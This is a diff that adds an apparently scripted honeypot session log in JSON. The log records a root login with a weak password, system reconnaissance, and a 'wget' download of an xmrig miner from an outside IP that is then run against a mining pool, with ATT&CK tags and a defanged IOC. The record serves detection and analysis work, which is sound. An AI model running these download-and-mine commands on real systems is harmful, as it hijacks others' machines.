@@ -1,0 +1,192 @@
+{
+    "id": "612aacc6047d434fa2a409af1a32452c",
+    "src_ip": "127.0.0.1",
+    "src_port": 52764,
+    "username": "root",
+    "password": "123456",
+    "client_version": "SSH-2.0-AsyncSSH_2.24.0",
+    "started_at": "2026-11-25T18:46:06.803231Z",
+    "ended_at": "2026-11-25T18:46:11.923606Z",
+    "end_reason": "exit",
+    "severity": {
+        "label": "Class 5",
+        "description": "High: the specimen logged in and tried to download tools, persist, mine cryptocurrency or add its own SSH key."
+    },
+    "open": false,
+    "events": [
+        {
+            "id": 4,
+            "timestamp": "2026-11-25T18:46:06.803231Z",
+            "kind": "session_start",
+            "payload": {
+                "src_ip": "127.0.0.1",
+                "src_port": 52764,
+                "client_version": "SSH-2.0-AsyncSSH_2.24.0"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 5,
+            "timestamp": "2026-11-25T18:46:06.807817Z",
+            "kind": "login_attempt",
+            "payload": {
+                "src_ip": "127.0.0.1",
+                "src_port": 52764,
+                "username": "root",
+                "password": "123456",
+                "client_version": "SSH-2.0-AsyncSSH_2.24.0",
+                "success": true
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 6,
+            "timestamp": "2026-11-25T18:46:07.413041Z",
+            "kind": "command",
+            "payload": {
+                "command": "whoami"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 7,
+            "timestamp": "2026-11-25T18:46:07.413590Z",
+            "kind": "response",
+            "payload": {
+                "output": "root"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 8,
+            "timestamp": "2026-11-25T18:46:08.314752Z",
+            "kind": "command",
+            "payload": {
+                "command": "uname -a"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 9,
+            "timestamp": "2026-11-25T18:46:08.315304Z",
+            "kind": "response",
+            "payload": {
+                "output": "Linux records-srv-09 2.6.18-92.el5 #1 SMP Tue Apr 29 13:16:15 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 10,
+            "timestamp": "2026-11-25T18:46:09.217065Z",
+            "kind": "command",
+            "payload": {
+                "command": "cat /proc/cpuinfo | grep -c processor"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 11,
+            "timestamp": "2026-11-25T18:46:09.217769Z",
+            "kind": "response",
+            "payload": {
+                "output": "bash: grep: command not found"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 12,
+            "timestamp": "2026-11-25T18:46:10.119169Z",
+            "kind": "command",
+            "payload": {
+                "command": "cd /tmp && wget http://198.51.100.77/xmrig -O .k"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 14,
+            "timestamp": "2026-11-25T18:46:10.119851Z",
+            "kind": "download_attempt",
+            "payload": {
+                "command": "wget http://198.51.100.77/xmrig -O .k",
+                "url": "http://198.51.100.77/xmrig"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 13,
+            "timestamp": "2026-11-25T18:46:10.120052Z",
+            "kind": "response",
+            "payload": {
+                "output": "--2026-11-25 18:46:10--  http://198.51.100.77/xmrig\nConnecting to 198.51.100.77:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 887359 (867K) [application/octet-stream]\nSaving to: '.k'\n\n.k      100%[===================>]    867K  1.21MB/s    in 0.3s\n\n2026-11-25 18:46:10 (1.21 MB/s) - '.k' saved [887359/887359]"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 15,
+            "timestamp": "2026-11-25T18:46:11.021327Z",
+            "kind": "command",
+            "payload": {
+                "command": "chmod +x .k && ./.k -o stratum+tcp://pool.example:3333"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 16,
+            "timestamp": "2026-11-25T18:46:11.021922Z",
+            "kind": "response",
+            "payload": {
+                "output": "Segmentation fault (core dumped)"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 17,
+            "timestamp": "2026-11-25T18:46:11.922915Z",
+            "kind": "command",
+            "payload": {
+                "command": "exit"
+            },
+            "generated_by": "scripted"
+        },
+        {
+            "id": 18,
+            "timestamp": "2026-11-25T18:46:11.923606Z",
+            "kind": "session_end",
+            "payload": {
+                "reason": "exit"
+            },
+            "generated_by": "scripted"
+        }
+    ],
+    "techniques": [
+        {
+            "attack_id": "T1078",
+            "name": "Valid Accounts",
+            "evidence_event_id": 5
+        },
+        {
+            "attack_id": "T1082",
+            "name": "System Information Discovery",
+            "evidence_event_id": 6
+        },
+        {
+            "attack_id": "T1105",
+            "name": "Ingress Tool Transfer",
+            "evidence_event_id": 12
+        },
+        {
+            "attack_id": "T1059.004",
+            "name": "Unix Shell",
+            "evidence_event_id": 6
+        },
+        {
+            "attack_id": "T1496",
+            "name": "Resource Hijacking",
+            "evidence_event_id": 12
+        }
+    ],
+    "lab_note": "Specimen 127.0.0.1 connected to the trap. The specimen logged in successfully. Commands run: 6. Techniques detected: T1078, T1082, T1105, T1059.004, T1496. Severity: Class 5. High: the specimen logged in and tried to download tools, persist, mine cryptocurrency or add its own SSH key.",
+    "iocs": [
+        "hxxp://198[.]51[.]100[.]77/xmrig"
+    ]
+}
